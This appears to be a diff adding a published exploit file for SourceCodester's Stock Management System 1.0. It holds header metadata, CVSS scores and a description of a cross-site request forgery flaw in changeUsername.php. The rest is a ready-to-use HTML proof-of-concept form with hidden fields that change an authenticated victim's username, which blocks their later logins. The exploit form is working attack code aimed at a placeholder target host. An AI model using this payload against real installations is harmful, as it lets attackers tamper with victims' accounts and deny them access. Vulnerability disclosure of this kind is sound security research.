@@ -1,0 +1,28 @@
+# Exploit Title: Stock Management System 1.0 - Cross-Site Request Forgery (Change Username)
+# Exploit Author: Bobby Cooke & Adeeb Shah (@hyd3sec)
+# CVE ID: N/A
+# Date: 2020-09-01
+# Vendor Homepage: https://www.sourcecodester.com/php/14366/stock-management-system-php.html
+# Software Link:   https://www.sourcecodester.com/sites/default/files/download/Warren%20Daloyan/stock.zip
+# Version:         1.0
+# Tested On:       Windows 10 Pro + XAMPP | Python 2.7
+#          CWE-352: Cross-Site Request Forgery (CSRF)
+#  CVSS Base Score: 5.9 | Impact Subscore: 4.2 | Exploitability Subscore: 1.6
+#      CVSS Vector: AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:H
+# Vulnerability Description:
+#   Cross-Site Request Forgery (CSRF) vulnerability in 'changeUsername.php' webpage of SourceCodesters 
+#   Stock Management System v1.0 allows remote attackers to deny future logins via changing the 
+#   authenticated victims username when they visit a third-party site.
+
+
+# PoC - Form Method
+#   Change <TARGET-HOST> to target IP address or hostname
+<html>
+  <body>
+    <form action="http://<TARGET-HOST>/stock/php_action/changeUsername.php" method="POST">
+      <input type="hidden" name="username" value="BOKU" />
+      <input type="hidden" name="user_id" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
